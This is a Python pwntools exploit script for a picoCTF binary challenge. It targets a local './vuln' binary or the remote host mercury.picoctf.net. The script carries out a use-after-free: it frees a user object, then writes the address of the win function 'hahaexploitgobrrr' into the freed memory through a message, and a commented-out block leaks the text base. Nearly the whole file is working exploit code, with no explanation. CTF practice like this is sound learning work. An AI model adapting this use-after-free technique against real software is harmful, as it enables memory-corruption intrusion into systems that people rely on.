#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("mercury.picoctf.net", 48259)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def free_user():
    p.sendlineafter("^W^", 'I')
    p.sendlineafter('?', 'Y')

def set_username(username):
    p.sendlineafter("^W^", 'M')
    p.sendlineafter(":", username)

def leave_msg(msg):
    p.sendlineafter("^W^", 'l')
    p.sendlineafter(":", msg)


"""
# text leak
p.recvuntil("^W^")
p.sendline("S")
p.recvuntil("OOP! Memory leak...")
hahaexploitgobrrr = eval(p.recv(9))
text_base = hahaexploitgobrrr - 0x7d6
log.info("text base: " + hex(text_base))
"""

set_username("0w0")
free_user()
leave_msg(p32(elf.symbols["hahaexploitgobrrr"]))

p.interactive()
